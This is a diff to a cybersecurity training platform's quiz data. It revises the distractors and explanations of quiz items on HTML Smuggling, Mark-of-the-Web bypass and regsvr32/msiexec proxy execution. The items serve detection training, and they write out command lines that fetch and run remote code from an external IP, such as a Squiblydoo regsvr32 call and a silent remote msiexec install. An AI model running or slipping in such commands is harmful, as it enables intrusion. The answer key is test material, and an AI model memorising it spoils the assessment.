@@ -200,13 +200,13 @@ export const roomsBatch49 = [
         "id": "hsl-q1",
         "question": "An analyst is asked to explain, in one sentence, the actual difference between HTML Smuggling (T1027.006) and a Mark-of-the-Web bypass (T1553.005) as this room's readings describe them. Which explanation is correct?",
         "options": [
-          "HTML Smuggling is about getting the malicious file PAST the network inspection layer undetected in the first place; a Mark-of-the-Web bypass is about what happens AFTER that file has already landed on disk, letting its contents run without the usual internet-download warning",
-          "They are two names for the exact same technique, and this room's readings use them interchangeably with no meaningful distinction between them at any point",
-          "HTML Smuggling only ever targets ISO files specifically, while a Mark-of-the-Web bypass only ever targets ZIP files specifically, making them mutually exclusive by file type",
-          "HTML Smuggling is a defense-side detection control that gateways deploy, while a Mark-of-the-Web bypass is the only offensive technique that HTML Smuggling is capable of enabling"
+          "HTML Smuggling gets the file past network inspection by assembling it inside the browser; a Mark-of-the-Web bypass lets that file's contents run from disk without the internet-download warning",
+          "HTML Smuggling strips the Zone.Identifier stream so SmartScreen stays silent; a Mark-of-the-Web bypass assembles the payload inside the browser to evade gateway inspection",
+          "HTML Smuggling evades only the email gateway's attachment scanner, while a Mark-of-the-Web bypass evades only proxy-level download inspection, so they are alternatives for one delivery stage",
+          "A Mark-of-the-Web bypass is the first delivery stage, getting the container past SmartScreen, and HTML Smuggling then runs the payload from inside that container"
         ],
         "answer": 0,
-        "explanation": "This room's HTML Smuggling reading is explicit about this exact distinction: HTML Smuggling operates at the network-delivery layer, before Mark-of-the-Web or SmartScreen get a chance to matter; the Mark-of-the-Web bypass this platform's Commodity Initial-Access room covers operates after the file has already landed. They are not interchangeable (option b), are not restricted to one file type each (option c -- the NOBELIUM case used an ISO, the QakBot case a ZIP, both via HTML Smuggling), and HTML Smuggling is an offensive delivery technique, not a defensive control (option d reverses this entirely).",
+        "explanation": "This room's HTML Smuggling reading is explicit about this exact distinction: HTML Smuggling operates at the network-delivery layer, before Mark-of-the-Web or SmartScreen get a chance to matter; the Mark-of-the-Web bypass this platform's Commodity Initial-Access room covers operates after the file has already landed. The Zone.Identifier stream is applied when the browser writes the file, and HTML Smuggling does not remove it -- the two techniques act at different layers, with different jobs (option b swaps them). They are not alternatives for a single stage (option c), and the order is reversed in option d: smuggling comes first, since the file must be delivered before any warning could be bypassed.",
         "xp": 25
       },
       {
@@ -268,13 +268,13 @@ export const roomsBatch49 = [
         "id": "hsl-q2",
         "question": "A Sysmon record shows regsvr32.exe launched with the command line: regsvr32 /s /n /u /i:http://185.221.20.44/svc.sct scrobj.dll, parented by explorer.exe. Which technique does this match, and what makes it recognizable as abuse rather than a routine software installation registering a DLL?",
         "options": [
-          "T1218.010 (Regsvr32) -- the Squiblydoo pattern, recognizable because it names a remote URL and scrobj.dll rather than a local application DLL path, and because it appears with no corresponding installer process (such as msiexec.exe) as an ancestor",
-          "T1218.005 (Mshta) -- recognizable because any command line containing the /i flag is, per this room's readings, exclusively associated with mshta.exe abuse and never with regsvr32.exe",
-          "T1127 (Trusted Developer Utilities Proxy Execution) -- recognizable because explorer.exe is, per this room's readings, always classified as a developer utility when it parents another process",
-          "T1553.005 (Mark-of-the-Web Bypass) -- recognizable because any process launched by explorer.exe is, by this room's own definition, automatically a Mark-of-the-Web bypass regardless of command line content"
+          "T1218.010 (Regsvr32) -- the Squiblydoo pattern: a remote URL and scrobj.dll instead of a local application DLL path, with no installer such as msiexec.exe as an ancestor",
+          "T1218.010 (Regsvr32), but routine -- explorer.exe as the parent shows a user-initiated action, which marks the registration as an ordinary self-install",
+          "T1218.011 (Rundll32) -- scrobj.dll is a DLL, and rundll32.exe is the binary that runs DLL functions, so this is a Rundll32 variant",
+          "T1218.005 (Mshta) -- loading a .sct scriptlet from a URL is the mshta.exe scriptlet pattern, recognizable by the .sct file extension"
         ],
         "answer": 0,
-        "explanation": "This is exactly the Squiblydoo shape this room's regsvr32 reading described: a remote URL, scrobj.dll rather than a real application DLL, and no installer ancestry. The /i flag belongs to regsvr32.exe's own syntax, not mshta.exe's (option b is invented and misattributes the binary). explorer.exe is the normal parent of anything a user double-clicks or launches from the Start menu -- it is not a developer utility, and T1127 refers to tools like MSBuild and WinDbg (option c is invented). T1553.005 concerns Mark-of-the-Web on downloaded container files, an entirely separate mechanism from a process's parent being explorer.exe (option d is invented).",
+        "explanation": "This is exactly the Squiblydoo shape this room's regsvr32 reading described: a remote URL, scrobj.dll rather than a real application DLL, and no installer ancestry. explorer.exe is the normal parent of anything a user double-clicks, including a downloaded file that launches the LOLBin -- so it does not make the command routine, and a self-install would reference a local DLL path rather than a remote URL (option b). The binary being run is regsvr32.exe, not rundll32.exe (option c). The .sct scriptlet pattern is shared across several LOLBins, so the extension does not identify mshta.exe; the binary and /i: syntax here are regsvr32's (option d).",
         "xp": 25
       },
       {
@@ -367,13 +367,13 @@ export const roomsBatch49 = [
         "id": "hsl-q3",
         "question": "Per this room's readings, which of the following command lines is the strongest indicator of msiexec.exe being abused for proxy execution, rather than a routine software installation?",
         "options": [
-          "msiexec.exe /i http://185.221.20.44/update.msi /quiet -- installing from an unfamiliar remote network location with no relationship to any known software vendor or internal deployment repository",
-          "msiexec.exe /i C:\\ProgramData\\CompanyDeploymentTool\\agent_v4.2.msi /quiet -- installing from a local path inside a folder this room's reading names as a known enterprise deployment tool's working directory",
-          "msiexec.exe /fa C:\\Windows\\Installer\\{GUID}.msi -- repairing an already-installed application referenced by its own cached installer database entry",
-          "msiexec.exe /x {GUID} -- uninstalling a previously-installed application by its product code, a routine and frequent administrative action"
+          "msiexec.exe /i http://185.221.20.44/update.msi /quiet -- installing silently from an unfamiliar external IP with no tie to a known vendor or deployment repository",
+          "msiexec.exe /i \\\\FS01\\Software\\agent_v4.2.msi /quiet -- installing silently from the organization's internal software share that IT uses for deployments",
+          "msiexec.exe /i C:\\Windows\\CCM\\Cache\\WarehouseScan_v4.2.msi /qn -- installing silently from the SCCM client cache during a deployment window",
+          "msiexec.exe /fa C:\\Windows\\Installer\\{GUID}.msi -- repairing an installed application from its cached installer database entry"
         ],
         "answer": 0,
-        "explanation": "This room's rundll32/msiexec reading names the installation SOURCE as the key discriminator: a routine install references a known, catalogued repository or vendor location, while an abused invocation references an MSI from an unexpected network location with no established relationship to the organization. Option a is exactly that unfamiliar remote source. Option b names a local, recognizable enterprise-deployment path. Options c and d are routine repair and uninstall operations referencing Windows' own local installer cache and product codes, neither of which this reading treats as suspicious on its own.",
+        "explanation": "This room's rundll32/msiexec reading names the installation SOURCE as the key discriminator: a routine install references a known, catalogued repository or vendor location, while an abused invocation references an MSI from an unexpected network location with no established relationship to the organization. Option a is exactly that unfamiliar remote source. Option b is also a network path and also silent, but the source is the organization's own known software share -- a catalogued repository, which this reading treats as routine. Option c installs from the local SCCM cache, a recognized deployment tool's directory. Option d is a repair that references Windows' own local installer cache, which this reading does not treat as suspicious on its own.",
         "xp": 25
       },
       {
@@ -552,13 +552,13 @@ export const roomsBatch49 = [
         "id": "hsl-q4",
         "question": "An analyst is building a detection rule for T1218 (System Binary Proxy Execution) abuse and wants to avoid re-teaching content this platform's Commodity Initial-Access room already covers in depth. Per this room, which TWO techniques should the analyst treat as cross-referenced background rather than re-derive from scratch, and why?",
         "options": [
-          "T1204.002 (User Execution: Malicious File) and T1105 (Ingress Tool Transfer) -- both appear in this room's delivery-to-execution chain, but this platform's Commodity Initial-Access room already covers the user-execution and loader/fetch mechanics in depth",
-          "T1218.005 (Mshta) and T1218.010 (Regsvr32) -- this room states these two sub-techniques are actually covered in full elsewhere and should not be studied in this room at all",
-          "T1027.006 (HTML Smuggling) and T1553.005 (Mark-of-the-Web Bypass) -- this room states both techniques are identical and interchangeable, making separate study of either one unnecessary",
-          "T1127 (Trusted Developer Utilities Proxy Execution) and T1218.007 (Msiexec) -- this room states neither technique has ever been observed in any real, documented intrusion"
+          "T1204.002 (User Execution: Malicious File) and T1105 (Ingress Tool Transfer) -- connective steps in this room's chain whose mechanics the Commodity Initial-Access room already covers in depth",
+          "T1027.006 (HTML Smuggling) and T1204.002 (User Execution: Malicious File) -- both open the delivery chain, so the Commodity Initial-Access room already covers them in depth",
+          "T1218.011 (Rundll32) and T1218.007 (Msiexec) -- both are proxy-execution neighbors of T1218, so the Commodity Initial-Access room already covers them in depth",
+          "T1127 (Trusted Developer Utilities Proxy Execution) and T1105 (Ingress Tool Transfer) -- both sit outside the four core binaries, so the Commodity Initial-Access room already covers them in depth"
         ],
         "answer": 0,
-        "explanation": "This room's ordering task and its supporting readings are explicit that T1204.002 and T1105 are the connective steps in the delivery chain, cross-linked to this platform's Commodity Initial-Access room rather than re-taught in depth here. T1218.005 and T1218.010 are two of this room's own four core, in-depth subjects, not content covered elsewhere (option b is false). T1027.006 and T1553.005 are explicitly distinguished as two DIFFERENT layers by this room's second reading, not identical techniques (option c inverts the room's central distinction). T1127 is named with real developer-utility examples, and T1218.007 is documented with real procedure examples (APT38, TA505, Mustang Panda/PlugX, IcedID, QakBot, Clop, Ragnar Locker) -- both have well-documented real-world use (option d is false).",
+        "explanation": "This room's ordering task and its supporting readings are explicit that T1204.002 and T1105 are the connective steps in the delivery chain, cross-linked to this platform's Commodity Initial-Access room rather than re-taught in depth here. T1027.006 (HTML Smuggling) is taught in this room's own delivery readings, so it is not background (option b). T1218.011 and T1218.007 are two of this room's four core, in-depth LOLBin subjects (option c). T1127 is only mentioned as a sibling family and is not covered by the Commodity room, so pairing it with T1105 is only half right (option d).",
         "xp": 25
       },
       {
